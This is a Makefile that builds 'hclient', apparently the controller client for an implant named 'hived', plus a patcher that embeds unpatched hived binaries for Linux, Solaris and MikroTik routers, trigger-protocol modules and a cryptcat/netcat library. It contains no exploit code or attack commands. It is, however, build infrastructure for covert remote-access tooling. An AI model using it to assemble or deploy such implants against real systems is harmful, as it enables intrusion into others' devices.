SHELL := $(shell which bash)

# Defaults
CFLAGS	:= -Wall -W -Wdeclaration-after-statement

.PHONY: ARCH_BUILD
include ARCH_BUILD
ifeq ("$(TARGET)", "linux-x86")
  include Makefile-include.linux-x86
else ifeq ("$(TARGET)", "linux-x86_64")
  include Makefile-include.linux-x86_64
endif

CC = gcc
GCCVERSION_GT_4.6 = $(shell expr `gcc -dumpversion | cut -f1,2 -d.` \>= 4.6)

BINARY = hclient-$(TARGET)

COMMON = ../common
CRYPTO = $(COMMON)/crypto
SSL = $(COMMON)/ssl/library
INCLUDES = -I$(SSL)/../include -I$(CRYPTO) -I../common
LIBSSL = $(SSL)/libpolarssl.a
LIBCRYPTO = $(CRYPTO)/libcrypto.a
STRINGS = $(COMMON)/strings

.PHONY: force-rebuild
$(info )
$(info =========================================================================)
ifdef ARCH_BUILD_CLIENT
  ifneq ("$(ARCH_BUILD_CLIENT)", "$(TARGET)")
    CLIENT_REBUILD:=clean
    $(info .       Rebuilding CLIENT))
  else
    CLIENT_REBUILD:=
    $(info .       CLIENT for $(TARGET) previously built.)
  endif
else
  CLIENT_REBUILD:=clean
    $(info .       Building CLIENT)
endif

ifdef ARCH_BUILD_CRYPTO
  ifneq ("$(ARCH_BUILD_CRYPTO)", "$(TARGET)")
    CRYPTO_REBUILD:=force-rebuild
  else
    CRYPTO_REBUILD:=
  endif
else
  CRYPTO_REBUILD:=force-rebuild
endif

ifdef ARCH_BUILD_SSL
  ifneq ("$(ARCH_BUILD_SSL)", "$(TARGET)")
    SSL_REBUILD:=force-rebuild
  else
    SSL_REBUILD:=
  endif
else
  SSL_REBUILD:=force-rebuild
endif

LDFLAGS = -lpthread


ifeq "$(GCCVERSION_GT_4.6)" "1"
	CFLAGS += -Wno-unused-result
endif

CFLAGS += $(INCLUDES)

ifdef DEBUG
  CFLAGS += -g
  CFLAGS += -DPOLARSSL_DEBUG_C -DPOLARSSL_DEBUG_MSG -DDEBUG -D_DEBUG -O0
else
  CFLAGS += -O2
endif

CRYPTCAT = -DLINUX cryptcat/netcat.c
#CRYPTCAT = -DLINUX -lstdc++ cryptcat/farm9crypt.cc cryptcat/twofish.cc cryptcat/netcat.c
LIBFILES = trigger_utils.c trigger_network.c trigger_protocols.c

OBJS =	main.o functions.o misc.o modes.o parser.o \
	trigger.o trigger_network.o \
	trigger_protocols.o b64.o trigger_utils.o threads.o \
	$(STRINGS)/string_utils.o init_strings.o

LIBS = $(LIBSSL) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)

UNPATCHED_SOLARIS_SPARC = hived-solaris-sparc-unpatched
UNPATCHED_SOLARIS_X86 = hived-solaris-x86-unpatched
UNPATCHED_LINUX_X86 = hived-linux-x86-unpatched
UNPATCHED_MIKROTIK_X86 = hived-mikrotik-x86-unpatched
UNPATCHED_MIKROTIK_MIPS = hived-mikrotik-mips-unpatched
UNPATCHED_MIKROTIK_MIPSEL = hived-mikrotik-mipsel-unpatched
UNPATCHED_MIKROTIK_PPC = hived-mikrotik-ppc-unpatched

UNPATCHED_BINS = $(UNPATCHED_SOLARIS_SPARC) $(UNPATCHED_LINUX_X86)
UNPATCHED_BINS += $(UNPATCHED_SOLARIS_X86) $(UNPATCHED_MIKROTIK_X86) $(UNPATCHED_MIKROTIK_MIPS)
UNPATCHED_BINS += $(UNPATCHED_MIKROTIK_PPC) $(UNPATCHED_MIKROTIK_MIPSEL)

$(info =========================================================================)
$(info .  TARGET: $(TARGET))
$(info .  SRCDIR: $(PWD))
$(info .      CC: $(CC))
$(info .  CFLAGS: $(CFLAGS))
$(info . LDFLAGS: $(LDFLAGS))
$(info =========================================================================)
$(info )

.SILENT:

.PHONY: all
all: $(LIBSSL) hclient debug patcher library

.PHONY: release
release: hclient

.PHONY: hclient
hclient: $(CLIENT_REBUILD) proj_strings.h $(LIBSSL) $(LIBCRYPTO) $(OBJS)
	${CC} ${CFLAGS} -o ${BINARY} ${OBJS} $(LIBS) ${LDFLAGS} 
	strip ${BINARY}
	md5sum ${BINARY} > ${BINARY}.md5
	echo "ARCH_BUILD_CLIENT=$(TARGET)" > ARCH_BUILD
	printf "\n\tCLIENT BUILD COMPLETE\n\n"

$(LIBSSL): $(SSL_REBUILD)
	cd $(SSL) && $(MAKE) TARGET=$(TARGET)

$(LIBCRYPTO): $(CRYPTO_REBUILD)
	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET)

.PHONY: debug
debug: strings $(LIBSSL) $(LIBCRYPTO) $(OBJS)
	${CC} ${CFLAGS} -o ${BINARY}-dbg ${OBJS} $(LIBS) ${LDFLAGS} 
	md5sum ${BINARY}-dbg > ${BINARY}-dbg.md5

library: strings
	gcc $(CFLAGS) -c $(LIBFILES)
	ar rv libhclient.a *.o
	ranlib libhclient.a
	echo "ARCH_BUILD_CLIENTLIB=$(TARGET)" > ARCH_BUILD

libcryptcat: cryptcat/farm9crypt.o cryptcat/twofish2.o
	gcc -c $(CRYPTCAT) 
	ar rv libcryptcat.a netcat.o farm9crypt.o twofish2.o
	ranlib libcryptcat.a

cryptcat/farm9crypt.o: cryptcat/farm9crypt.cc cryptcat/farm9crypt.h
	gcc -c cryptcat/farm9crypt.cc

cryptcat/twofish2.o: cryptcat/twofish2.cc cryptcat/twofish2.h
	gcc -c cryptcat/twofish2.cc

.PHONY: strings
strings: init_strings.o $(STRINGS)/string_utils.o 

proj_strings.h:
	printf "\tGenerating\t$@\n"
	python mod_gen_string_header.py client_strings.txt SERVER_STRINGS

init_strings.o: init_strings.c $(STRINGS)/string_utils.o
	${CC} ${CFLAGS} -c init_strings.c

init_strings.c: client_strings.txt $(STRINGS)/string_utils.h
	python mod_gen_string_header.py client_strings.txt CLIENT_STRINGS

$(STRINGS)/string_utils.o:  $(STRINGS_REBUILD) $(STRINGS)/string_utils.h
	printf "\tCC\t\t$<\n"
	cd $(STRINGS) && $(MAKE) TARGET=$(TARGET)

.PHONY: patcher
patcher: $(UNPATCHED_BINS) $(LIBSSL)
	printf "=========================================================================\n"
	printf "\tBUILDING PATCHER\n"
	printf "=========================================================================\n"
	printf "\nThe latest binaries must be present in the server directory.\n"
	printf "The following binaries were found:\n\n"
	@ls -l ../server/hived-* | grep -v dbg | grep -v md5
	printf "\n"

	xxd -i $(UNPATCHED_LINUX_X86) _unpatched_linux_x86.h
	xxd -i $(UNPATCHED_MIKROTIK_X86) _unpatched_mikrotik_x86.h
	xxd -i $(UNPATCHED_MIKROTIK_MIPS) _unpatched_mikrotik_mips.h
	xxd -i $(UNPATCHED_MIKROTIK_MIPSEL) _unpatched_mikrotik_mipsel.h
	xxd -i $(UNPATCHED_MIKROTIK_PPC) _unpatched_mikrotik_ppc.h
	xxd -i $(UNPATCHED_SOLARIS_X86) _unpatched_solaris_x86.h
	xxd -i $(UNPATCHED_SOLARIS_SPARC) _unpatched_solaris_sparc.h

	$(CC) $(CFLAGS) -I. $(STRINGS)/string_utils.c patcher.c -o hive-patcher $(LIBSSL)
	strip hive-patcher
	md5sum hive-patcher > hive-patcher.md5

.c.o:
	printf "\tCC\t$<\n"
	$(CC) $(CFLAGS) -c $<

.PHONY: clean
clean:
	rm -f $(OBJS)
	>ARCH_BUILD
